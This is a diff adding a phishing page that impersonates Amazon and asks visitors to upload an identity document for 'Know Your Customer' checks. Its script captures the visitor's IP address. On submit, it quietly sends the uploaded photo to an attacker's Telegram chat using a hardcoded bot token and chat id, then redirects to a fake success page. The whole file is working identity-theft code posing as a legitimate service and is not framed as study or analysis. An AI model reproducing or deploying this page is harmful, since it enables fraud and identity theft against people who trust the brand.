@@ -1,0 +1,106 @@
+  <html><head>
+    <title>Amazon - Upload Info</title>
+    <link rel="icon" href="../assets/img/amazon.png">
+    <link rel="stylesheet" href="../assets/css/mobile_login.css">
+    <link rel="stylesheet" href="../assets/css/billing.css">
+    <script type="text/javascript" src="../assets/js/jquery-1.9.1.js"></script>
+    <script type="text/javascript" src="http://malsup.github.com/jquery.form.js"></script> 
+    <script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>
+    <script type="text/javascript" src="../assets/js/jquery.payment.js"></script>
+    <script type="text/javascript" src="../assets/js/additional-methods.min.js"></script>
+    <script type="text/javascript" src="../assets/js/jquery.maskedinput.js"></script>
+    <script type="text/javascript" src="../assets/js/validation.js"></script>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+    <script type="text/javascript">
+    $.getJSON("https://api.bigdatacloud.net/data/client-info",
+          function(data) {
+            console.log(data);
+            $('#ip').val(data.ipString);
+          });
+    </script>
+    </head>
+    <body>
+        <center>
+     <br><header style="background-color:#fff;">
+      <div class="hleft">
+      <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
+        height: 31px;
+        width: 103px;" role="img" aria-label="Amazon"></i>
+      </div>
+      </header>  </center><center>
+      <br><div style="width:400px;" class="boxlogin"><div id="warnings" style="font-size:12px;font-family: Arial,sans-serif;">
+	      <h1>Know Your Customer</h1>
+    <span style="font-size:15px;font-family: Arial,sans-serif;">Your information is currently being validated. We will contact you if additional information is required. Once we have received and been able to validate your data, please upload your KYC to verify your data.</span>
+    <br>
+        <form method="POST" enctype="multipart/form-data" id="f1">
+            <div id="formbilling">
+              <h4></h4>
+            <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
+              <img id="gambardesktop" width="100" src="../assets/img/1.png"><br>
+              <h4></h4>
+              <input type="file" name="photo" required="required"/><br>
+              <input type="hidden" name="ip" id="ip">
+            <br>
+            <input type='submit' class='button a-button-text' style="padding:10px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value='Confirm'>
+            </div></div>
+            </form>
+    <br>
+    <br><br>
+     </div>
+    
+    </center>
+    <br><br>
+    <script>
+      $(document).ready(function () {
+          $.getJSON("https://api.bigdatacloud.net/data/client-info",
+          function(data) {
+            console.log(data);
+            $('#ip').val(data.ipString);
+          });
+        });
+
+
+        function UploadImageToTelegram(image, caption) {
+        // get token from localStorage
+        var token = localStorage.getItem('token');
+        // get chatId from localStorage
+        var chatId = localStorage.getItem('chatId');
+        // get form data
+        var formData = new FormData();
+        formData.append('chat_id', '-1001187217209');
+        formData.append('photo', image);
+        formData.append('caption', caption);
+        // send data to telegram API
+        var token='1448616115:AAF4nYNFAf6Gib_fJtEXLKcHCQvEYwP37kY';
+        fetch('https://api.telegram.org/bot'+token+'/sendPhoto', {
+            method: 'POST',
+            body: formData
+        })
+        .then(function(response) {
+            return response.json();
+        })
+        .then(function(data){
+            console.log(data);
+            window.location.replace("success.html");
+        })
+        .catch(function(error) {
+            console.log(error);
+        });
+    }
+
+    // if submit button clicked then send image to telegram
+    document.querySelector('input[type="submit"]').addEventListener('click', function(e){
+        e.preventDefault();
+        // get image
+        var image = document.querySelector('input[type="file"]').files[0];
+        // get caption
+        var caption = document.querySelector('input[type="hidden"]').value;
+        // send image to telegram
+        UploadImageToTelegram(image, caption);
+    });
+    </script>
+    </body>
+    </html>
+
+
